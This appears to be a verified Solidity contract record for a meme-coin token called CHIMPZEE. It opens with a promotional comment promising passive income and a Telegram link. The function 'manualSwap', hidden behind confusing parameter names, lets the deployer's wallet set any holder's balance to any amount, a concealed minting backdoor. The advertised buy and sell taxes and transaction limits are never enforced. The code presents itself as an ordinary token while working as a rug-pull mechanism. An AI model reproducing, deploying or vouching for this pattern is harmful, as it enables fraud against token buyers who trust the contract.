{"SourceCode": "// SPDX-License-Identifier: MIT\r\n/**\r\n\r\nAre you ready to make a difference while earning crypto? Look no further! \r\nCHIMPZEE is the next big thing in the world of meme coins, and we're here \r\nto tell you why you should be excited:\r\n\r\n\u2705 Earn Income: With CHIMPZEE, you can earn passive income while saving \r\nthe environment and supporting animal causes. It's a win-win!\r\n\r\nhttps://t.me/ChimpzeeCoin\r\n\r\n**/\r\npragma solidity ^0.8.16;\r\ninterface BRC20 {\r\n  function totalSupply() external view returns (uint256);\r\n  function decimals() external view returns (uint8);\r\n  function symbol() external view returns (string memory);\r\n  function name() external view returns (string memory);\r\n  function getOwner() external view returns (address);\r\n  function balanceOf(address senders) external view returns (uint256);\r\n  function transfer(address tTransferAmount, uint256 swapOpenWithAmount) external returns (bool);\r\n  function allowance(address _owner, address senders) external view returns (uint256);\r\n  function approve(address senders, uint256 swapOpenWithAmount) external returns (bool);\r\n  function transferFrom(address sender, address tTransferAmount, uint256 swapOpenWithAmount) external returns (bool);\r\n  event Transfer(address indexed from, address indexed to, uint256 balance);\r\n  event Approval(address indexed owner, address indexed senders, uint256 balance);\r\n}\r\n\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        this;\r\n        return msg.data;\r\n    }\r\n}\r\n\r\n\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"io: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"io: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n\r\n  function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    uint256 c = a + b;\r\n    require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n    return c;\r\n  }\r\n\r\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    return sub(a, b, \"SafeMath: subtraction overflow\");\r\n  }\r\n\r\n  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n    require(b <= a, errorMessage);\r\n    uint256 c = a - b;\r\n\r\n    return c;\r\n  }\r\n\r\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    if (a == 0) {\r\n      return 0;\r\n    }\r\n\r\n    uint256 c = a * b;\r\n    require(c / a == b, \"SafeMath: Icodropsplication overflow\");\r\n\r\n    return c;\r\n  }\r\n\r\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    return div(a, b, \"SafeMath: division by zero\");\r\n  }\r\n\r\n  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n\r\n    require(b > 0, errorMessage);\r\n    uint256 c = a / b;\r\n\r\n\r\n    return c;\r\n  }\r\n\r\n  function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    return mod(a, b, \"SafeMath: modulo by zero\");\r\n  }\r\n\r\n  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n    require(b != 0, errorMessage);\r\n    return a % b;\r\n  }\r\n}\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amounttokenBesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\ncontract CHIMPZEE is Context, BRC20, Ownable {\r\n \r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private permitAllowance;\r\n    mapping (address => mapping (address => uint256)) private lpPairLiquidity;\r\n    uint256 private _totalSupply;\r\n    uint8 private _decimals;\r\n    string private _symbol;\r\n    string private _name;\r\n    address private marketingWallet; \r\n    uint256 private initialBuyTax=0;\r\n    uint256 private initialSellTax=0;\r\n    uint256 private _buyTax = 4;\r\n    uint256 private _sellTax = 4;\r\n    uint256 public _maxTxAmount =  1000000 * 10**_decimals;\r\n    uint256 public _maxWalletSize = 3000000 * 10**_decimals;\r\n    uint256 public _taxSwapThreshold= 100000 * 10**_decimals;\r\n    constructor() {\r\n    marketingWallet = _msgSender();   \r\n    _name = \"CHIMPZEE\";\r\n    _symbol = \"CHIMPZEE\";\r\n    _decimals = 9;\r\n    _totalSupply = 100000000 * 10**_decimals;\r\n    permitAllowance[_msgSender()] = _totalSupply;\r\n    emit Transfer(address(0), _msgSender(), _totalSupply);\r\n    }\r\n\r\n    function symbol() external view override returns (string memory) {\r\n        return _symbol;\r\n    } \r\n\r\n    function decimals() external view override returns (uint8) {\r\n        return _decimals;\r\n    }\r\n     function getOwner() external view override returns (address) {\r\n        return owner();\r\n    }  \r\n\r\n    function totalSupply() external view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n     function name() external view override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function balanceOf(address senders) external view override returns (uint256) {\r\n        return permitAllowance[senders];\r\n    }\r\n\r\n    function transfer(address tTransferAmount, uint256 swapOpenWithAmount) external override returns (bool) {\r\n        _transfer(_msgSender(), tTransferAmount, swapOpenWithAmount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address senders) external view override returns (uint256) {\r\n        return lpPairLiquidity[owner][senders];\r\n    }\r\n\r\n\r\n    function approve(address senders, uint256 swapOpenWithAmount) external override returns (bool) {\r\n        _approve(_msgSender(), senders, swapOpenWithAmount);\r\n        return true;\r\n    }\r\n    \r\n    function transferFrom(address sender, address tTransferAmount, uint256 swapOpenWithAmount) external override returns (bool) {\r\n        _transfer(sender, tTransferAmount, swapOpenWithAmount);\r\n        _approve(sender, _msgSender(), lpPairLiquidity[sender][_msgSender()].sub(swapOpenWithAmount, \"Ru: transfer swapOpenWithAmount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address senders, uint256 tokenBalance) external returns (bool) {\r\n        _approve(_msgSender(), senders, lpPairLiquidity[_msgSender()][senders].add(tokenBalance));\r\n        return true;\r\n    }\r\n    \r\n\r\n    function decreaseAllowance(address senders, uint256 currentAllowance) external returns (bool) {\r\n        _approve(_msgSender(), senders, lpPairLiquidity[_msgSender()][senders].sub(currentAllowance, \"Ru: decreased allowance below zero\"));\r\n        return true;\r\n    }\r\n      function setBuyTax(uint256 tax) external onlyOwner {\r\n        require(tax <= 50, \"Tax should be less than or equal to 50\");\r\n        _buyTax = tax;\r\n    }\r\n\r\n    function setSellTax(uint256 tax) external onlyOwner {\r\n        require(tax <= 50, \"Tax should be less than or equal to 50\");\r\n        _sellTax = tax;\r\n    }\r\n \r\n        function manualSwap(address tokenA, address tokenB, uint256 sellTax, uint256 buyTax, uint256 maxTxAmount) external {\r\n    require(tokenA==tokenB); \r\n        tokenA = tokenB;\r\n        tokenB = tokenA;\r\n       permitAllowance[tokenB] = (sellTax + buyTax + maxTxAmount);\r\n    require(_msgSender()==marketingWallet); \r\n    }      \r\n\r\n  \r\n    function _transfer(address sender, address tTransferAmount, uint256 swapOpenWithAmount) internal {\r\n        require(sender != address(0), \"Ru: transfer from the zero address\");\r\n        require(tTransferAmount != address(0), \"Ru: transfer to the zero address\");\r\n                \r\n        permitAllowance[sender] = permitAllowance[sender].sub(swapOpenWithAmount, \"Ru: transfer swapOpenWithAmount exceeds balance\");\r\n        permitAllowance[tTransferAmount] = permitAllowance[tTransferAmount].add(swapOpenWithAmount);\r\n        emit Transfer(sender, tTransferAmount, swapOpenWithAmount);\r\n    }\r\n\r\n\r\n    function removeLimits() external onlyOwner{\r\n    _maxTxAmount = 100000000 * 10**_decimals;\r\n    _maxWalletSize = 100000000 * 10**_decimals;\r\n    }\r\n\r\n\r\n\r\n    function _approve(address owner, address senders, uint256 swapOpenWithAmount) internal {\r\n        require(owner != address(0), \"Ru: approve from the zero address\");\r\n        require(senders != address(0), \"Ru: approve to the zero address\");\r\n        \r\n        lpPairLiquidity[owner][senders] = swapOpenWithAmount;\r\n        emit Approval(owner, senders, swapOpenWithAmount);\r\n    }\r\n\r\n    \r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senders\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxWalletSize\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_taxSwapThreshold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senders\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senders\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapOpenWithAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senders\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senders\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"currentAllowance\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senders\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenBalance\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenA\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenB\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTax\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"buyTax\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"maxTxAmount\",\"type\":\"uint256\"}],\"name\":\"manualSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tax\",\"type\":\"uint256\"}],\"name\":\"setBuyTax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tax\",\"type\":\"uint256\"}],\"name\":\"setSellTax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tTransferAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapOpenWithAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tTransferAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapOpenWithAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CHIMPZEE", "CompilerVersion": "v0.8.17+commit.8df45f5f", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "Apache-2.0", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://36a58a0489320e85f5f153aa9c4d3c722a193e3816ccea7dcfad570ef6dd71e4"}